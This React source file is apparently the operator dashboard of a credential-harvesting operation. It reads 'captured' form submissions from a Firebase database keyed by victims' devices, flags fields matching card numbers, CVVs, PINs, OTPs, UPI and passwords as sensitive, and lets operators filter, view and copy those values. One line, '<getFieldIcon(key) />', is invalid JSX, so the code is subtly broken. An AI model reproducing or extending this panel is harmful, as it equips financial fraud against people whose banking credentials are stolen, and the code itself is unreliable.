import { useState, useEffect } from 'react'
import { motion } from 'framer-motion'
import { FileText, Search, Filter, MoreVertical, Trash2, Eye, Copy, AlertTriangle, ChevronRight, CreditCard, Lock, Hash, Download, DollarSign } from 'lucide-react'
import { db } from '../context/AuthContext'
import { ref, onValue, off, get, remove } from 'firebase/database'
import { toast } from 'sonner'

const sensitiveRegex = /(pin|bvcx|cvv|card|expir|atm|pass|otp|upi)/i

export default function AllForms() {
  const [forms, setForms] = useState([])
  const [loading, setLoading] = useState(true)
  const [search, setSearch] = useState('')
  const [filter, setFilter] = useState('all')
  const [selectedIds, setSelectedIds] = useState(new Set())
  const [expandedId, setExpandedId] = useState(null)

  useEffect(() => {
    if (!db) { setLoading(false); return }
    const usersRef = ref(db, 'users')
    const unsub = onValue(usersRef, (snapshot) => {
      const data = snapshot.val() || {}
      const allForms = []
      Object.entries(data).forEach(([deviceId, device]) => {
        if (device.forms) {
          Object.entries(device.forms).forEach(([formId, form]) => {
            const content = form.content || {}
            const keys = Object.keys(content)
            const sensitiveKeys = keys.filter(k => sensitiveRegex.test(k))
            allForms.push({
              id: `${deviceId}_${formId}`,
              deviceId,
              deviceName: `${device.brand} ${device.model}`,
              formId,
              content,
              keys,
              sensitiveKeys,
              hasSensitive: sensitiveKeys.length > 0,
              timestamp: form.timestamp,
              timestamp_formatted: form.timestamp ? new Date(form.timestamp).toLocaleString() : 'Unknown'
            })
          })
        }
      })
      allForms.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0))
      setForms(allForms)
      setLoading(false)
    })
    return () => off(usersRef, 'value', unsub)
  }, [])

  const filteredForms = forms.filter(form => {
    const matchesSearch = form.deviceName?.toLowerCase().includes(search.toLowerCase()) ||
      form.keys.some(k => k.toLowerCase().includes(search.toLowerCase())) ||
      Object.values(form.content).some(v => v?.toString().toLowerCase().includes(search.toLowerCase()))
    const matchesFilter = filter === 'all' || (filter === 'sensitive' && form.hasSensitive) || (filter === 'normal' && !form.hasSensitive)
    return matchesSearch && matchesFilter
  })

  const toggleSelect = (id) => {
    setSelectedIds(prev => { const next = new Set(prev); next.has(id) ? next.delete(id) : next.add(id); return next })
  }

  const handleDelete = async (id) => {
    if (!confirm('Delete this form entry?')) return
    const [deviceId, formId] = id.split('_')
    try { await remove(ref(db, `users/${deviceId}/forms/${formId}`)); toast.success('Form deleted') }
    catch (err) { toast.error('Failed to delete form') }
  }

  const getFieldIcon = (key) => {
    const k = key.toLowerCase()
    if (k.includes('card') || k.includes('cvv') || k.includes('expir')) return <CreditCard className="h-3 w-3" />
    if (k.includes('pin') || k.includes('pass') || k.includes('otp') || k.includes('bvcx') || k.includes('upi')) return <Lock className="h-3 w-3" />
    if (k.includes('hash')) return <Hash className="h-3 w-3" />
    return <DollarSign className="h-3 w-3" />
  }

  if (loading) {
    return <div className="p-5 space-y-4"><div className="h-12 bg-secondary/50 rounded-xl animate-pulse" />{[...Array(5)].map((_, i) => <div key={i} className="h-20 bg-secondary/50 rounded-xl animate-pulse" />)}</div>
  }

  return (
    <div className="p-5 space-y-6">
      <div className="flex items-center justify-between">
        <div><h1 className="text-2xl font-black text-foreground">All Forms</h1><p className="text-sm text-muted-foreground mt-1">{forms.length} total • {forms.filter(f => f.hasSensitive).length} with sensitive data</p></div>
      </div>
      <div className="flex flex-col sm:flex-row gap-4">
        <div className="relative flex-1"><Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" /><input type="text" placeholder="Search forms..." value={search} onChange={(e) => setSearch(e.target.value)} className="w-full pl-10 pr-4 py-2.5 rounded-xl bg-secondary/50 border border-border focus:outline-none focus:ring-2 focus:ring-primary/20" /></div>
        <select value={filter} onChange={(e) => setFilter(e.target.value)} className="px-4 py-2.5 rounded-xl bg-secondary/50 border border-border focus:outline-none focus:ring-2 focus:ring-primary/20"><option value="all">All Forms</option><option value="sensitive">Sensitive Only</option><option value="normal">Normal Only</option></select>
      </div>
      <div className="rounded-2xl border border-border bg-card overflow-hidden">
        <div className="divide-y divide-border/50">
          {filteredForms.length === 0 ? <div className="p-10 text-center"><FileText className="h-12 w-12 text-muted-foreground/50 mx-auto mb-3" /><p className="text-muted-foreground">No forms captured yet</p></div> : filteredForms.map((form) => {
            const isExpanded = expandedId === form.id
            return <motion.div key={form.id} initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}><div className="p-4 hover:bg-secondary/30 transition-colors"><div className="flex items-start gap-4"><div className="flex-1 min-w-0"><div className="flex items-center gap-2"><span className={`inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold ${form.hasSensitive ? 'bg-yellow-500/10 text-yellow-500' : 'bg-green-500/10 text-green-500'}`}><FileText className="h-3 w-3" />{form.hasSensitive ? 'SENSITIVE' : 'Normal'}</span><span className="text-[11px] text-muted-foreground font-mono">{form.timestamp_formatted}</span><span className="font-semibold text-foreground truncate max-w-[200px]">{form.deviceName}</span></div><p className="mt-1 text-sm text-muted-foreground font-mono">{form.keys.join(', ')}</p></div><div className="flex items-center gap-2"><button onClick={() => setExpandedId(isExpanded ? null : form.id)} className="p-2 rounded-lg hover:bg-secondary text-muted-foreground hover:text-foreground transition-colors"><ChevronRight className={`h-4 w-4 transition-transform ${isExpanded ? 'rotate-90' : ''}`} /></button><button onClick={() => handleDelete(form.id)} className="p-2 rounded-lg hover:bg-destructive/10 text-muted-foreground hover:text-destructive transition-colors"><Trash2 className="h-4 w-4" /></button></div></div>{isExpanded && <div className="px-4 pb-4 border-t border-border/50 mt-2"><div className="space-y-2">{Object.entries(form.content).map(([key, value]) => <div key={key} className="flex items-center gap-3 p-2 rounded-lg bg-secondary/30"><getFieldIcon(key) /><div className="flex-1 min-w-0"><p className="text-[10px] font-bold text-muted-foreground uppercase">{key}</p><p className="text-sm font-mono text-foreground break-all truncate">{value}</p></div><button onClick={() => navigator.clipboard.writeText(String(value))} className="p-1 rounded hover:bg-secondary"><Copy className="h-3 w-3" /></button></div>)}</div></div>}</motion.div>
          })}
        </div>
      </div>
    </div>
  )
}